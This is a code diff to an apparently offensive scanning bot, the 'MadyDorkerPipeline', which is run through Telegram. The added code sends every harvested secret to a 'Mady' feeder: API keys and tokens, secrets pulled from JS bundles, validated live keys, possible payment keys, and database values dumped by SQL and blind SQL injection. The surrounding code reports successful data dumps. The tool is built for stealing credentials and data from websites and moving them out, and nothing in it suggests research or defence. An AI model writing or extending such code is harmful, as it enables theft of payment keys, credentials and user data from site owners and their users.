@@ -963,6 +963,17 @@ class MadyDorkerPipeline:
                                             url, secret.type, secret.key_name,
                                             secret.value, secret.category,
                                         )
+                                    # Feed ALL high-confidence secrets to Mady (API keys, tokens, etc.)
+                                    if self.mady_feeder and secret.confidence >= 0.70:
+                                        try:
+                                            fed = self.mady_feeder.feed_gateway(
+                                                url, secret.type, secret.value,
+                                                extra={"confidence": secret.confidence, "source": "secret_extraction", "category": secret.category},
+                                            )
+                                            if fed:
+                                                result["mady_fed"] = result.get("mady_fed", 0) + 1
+                                        except Exception:
+                                            pass
                     
                     # ─── Step 3b: JS Bundle Analysis ───────────────────────────
                     # Parse webpack/Next.js/Vite chunks for hidden API endpoints,
@@ -1036,6 +1047,17 @@ class MadyDorkerPipeline:
                                         await self.reporter.report_secret(
                                             url, secret_obj_type, secret_key, secret_val, "js_bundle",
                                         )
+                                    # Feed ALL JS-discovered secrets to Mady bot
+                                    if self.mady_feeder:
+                                        try:
+                                            fed = self.mady_feeder.feed_gateway(
+                                                url, secret_obj_type, secret_val,
+                                                extra={"confidence": secret_conf, "source": "js_bundle"},
+                                            )
+                                            if fed:
+                                                result["mady_fed"] = result.get("mady_fed", 0) + 1
+                                        except Exception:
+                                            pass
                                 
                                 # Report summary to Telegram
                                 js_msg = (
@@ -1539,6 +1561,19 @@ class MadyDorkerPipeline:
                                         }
                                         for v in batch.results
                                     ]
+                                    # Feed ALL validated live keys to Mady bot
+                                    if self.mady_feeder:
+                                        for v in batch.results:
+                                            if v.is_live:
+                                                try:
+                                                    fed = self.mady_feeder.feed_gateway(
+                                                        url, v.key_type, v.display_key,
+                                                        extra={"source": "key_validation", "is_live": True, "risk": v.risk_level},
+                                                    )
+                                                    if fed:
+                                                        result["mady_fed"] = result.get("mady_fed", 0) + 1
+                                                except Exception:
+                                                    pass
                         except Exception as e:
                             logger.debug(f"Key validation failed: {e}")
 
@@ -3835,6 +3870,12 @@ async def _do_scan(update: Update, url: str):
                                                         r.url, f"DB: {col}", val,
                                                         {"source": "SQL injection dump via /scan"}
                                                     )
+                                                    # Feed to Mady bot
+                                                    if p.mady_feeder:
+                                                        try:
+                                                            p.mady_feeder.feed_gateway(r.url, f"db_{col}", val, extra={"source": "sqli_dump_scan"})
+                                                        except Exception:
+                                                            pass
                                         
                                         dump_text = (
                                             f"📦 <b>Data Dump Successful!</b>\n"
@@ -3929,6 +3970,12 @@ async def _do_scan(update: Update, url: str):
                                                         r.url, f"DB: {col}", val,
                                                         {"source": f"Blind {r.injection_type} SQLi dump via /scan"}
                                                     )
+                                                    # Feed to Mady bot
+                                                    if p.mady_feeder:
+                                                        try:
+                                                            p.mady_feeder.feed_gateway(r.url, f"db_{col}", val, extra={"source": "blind_sqli_dump_scan"})
+                                                        except Exception:
+                                                            pass
                                         
                                         dump_text = (
                                             f"🐢📦 <b>Blind Dump Successful!</b>\n"
@@ -3973,7 +4020,7 @@ async def _do_scan(update: Update, url: str):
         # Save state
         p._save_state()
     
-    # Report gateway secrets  
+    # Report gateway secrets + feed ALL to Mady bot
     for secret in all_secrets:
         if secret.category == "gateway":
             p.found_gateways.append({
@@ -3986,6 +4033,24 @@ async def _do_scan(update: Update, url: str):
                 secret.url, secret.type, secret.value,
                 {"confidence": secret.confidence}
             )
+            # Feed to Mady bot
+            if p.mady_feeder:
+                try:
+                    p.mady_feeder.feed_gateway(
+                        secret.url, secret.type, secret.value,
+                        extra={"confidence": secret.confidence, "source": "scan_command"},
+                    )
+                except Exception:
+                    pass
+        # Also feed non-gateway API secrets to Mady (may contain payment keys)
+        elif p.mady_feeder and getattr(secret, 'confidence', 0) >= 0.70:
+            try:
+                p.mady_feeder.feed_gateway(
+                    secret.url, secret.type, secret.value,
+                    extra={"confidence": secret.confidence, "source": "scan_command", "category": secret.category},
+                )
+            except Exception:
+                pass
     
     # ═══════ BUILD FINAL REPORT ═══════
     text = f"━━━━━━━━━━━━━━━━━━━━\n🔍 <b>Full Domain Scan Report</b>\n━━━━━━━━━━━━━━━━━━━━\n"
